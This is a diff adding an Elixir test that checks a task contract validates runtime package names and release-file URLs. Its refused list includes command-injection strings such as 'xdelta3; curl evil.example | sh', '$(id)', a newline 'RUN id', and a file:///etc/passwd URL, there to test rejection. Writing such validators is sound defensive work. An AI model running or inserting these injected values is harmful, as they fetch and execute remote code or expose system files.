@@ -79,6 +79,71 @@ defmodule Eab.TaskContractTest do
     for changed <- changes, do: assert_raise(RuntimeError, fn -> TaskContract.read(changed) end)
   end
 
+  test "extra packages and release files: valid lists load, refused lists and hosts do not" do
+    old = Application.get_env(:eab, :release_file_hosts)
+    Application.put_env(:eab, :release_file_hosts, ["releases.example.test"])
+    on_exit(fn -> Application.put_env(:eab, :release_file_hosts, old) end)
+
+    sha = String.duplicate("ab", 32)
+
+    file = %{
+      "url" => "https://releases.example.test/tool_1.0_amd64.deb",
+      "sha256" => sha,
+      "kind" => "deb"
+    }
+
+    with_runtime = fn runtime -> Map.put(spec(), "runtime", Map.put(runtime, "image", "base")) end
+
+    for runtime <- [
+          %{},
+          %{"packages" => []},
+          %{"release_files" => []},
+          %{"packages" => ["xdelta3", "mtools", "libconfuse2", "g++", "py3-pip", "libc6.1"]},
+          %{"release_files" => [file]},
+          %{"packages" => ["xdelta3"], "release_files" => [file]}
+        ],
+        do: assert(TaskContract.read(with_runtime.(runtime))["kind"] == "feature")
+
+    assert TaskContract.runtime_extras!(%{}) == %{"packages" => [], "release_files" => []}
+
+    refused = [
+      %{"packages" => "xdelta3"},
+      %{"packages" => ["xdelta3", "xdelta3"]},
+      %{"packages" => [""]},
+      %{"packages" => ["Xdelta3"]},
+      %{"packages" => ["-xdelta3"]},
+      %{"packages" => ["xdelta3; curl evil.example | sh"]},
+      %{"packages" => ["xdelta3 mtools"]},
+      %{"packages" => ["$(id)"]},
+      %{"packages" => ["xdelta3\nRUN id"]},
+      %{"packages" => [7]},
+      %{"release_files" => file},
+      %{"release_files" => [file, file]},
+      %{"release_files" => [Map.put(file, "kind", "tar")]},
+      %{"release_files" => [Map.put(file, "sha256", String.upcase(sha))]},
+      %{"release_files" => [Map.put(file, "sha256", "abc")]},
+      %{"release_files" => [Map.delete(file, "sha256")]},
+      %{"release_files" => [Map.put(file, "install", "dpkg -i")]},
+      %{"release_files" => [Map.put(file, "url", "http://releases.example.test/tool.deb")]},
+      %{"release_files" => [Map.put(file, "url", "https://user@releases.example.test/tool.deb")]},
+      %{"release_files" => [Map.put(file, "url", "https://releases.example.test/a b.deb")]},
+      %{"release_files" => [Map.put(file, "url", "file:///etc/passwd")]},
+      # A host the installation does not allow, and one that only ends like an allowed one.
+      %{"release_files" => [Map.put(file, "url", "https://github.com/fwup-home/fwup/fwup.deb")]},
+      %{"release_files" => [Map.put(file, "url", "https://evilreleases.example.test/tool.deb")]}
+    ]
+
+    for runtime <- refused,
+        do: assert_raise(RuntimeError, fn -> TaskContract.read(with_runtime.(runtime)) end)
+
+    # With no allowed host at all (the default), no release file loads.
+    Application.put_env(:eab, :release_file_hosts, [])
+
+    assert_raise RuntimeError, ~r/not allowed/, fn ->
+      TaskContract.read(with_runtime.(%{"release_files" => [file]}))
+    end
+  end
+
   test "qualification rejects missing capabilities only as named completed test failures" do
     contract = TaskContract.read(spec())
     without_partial = TaskContract.read(spec("feature", false))
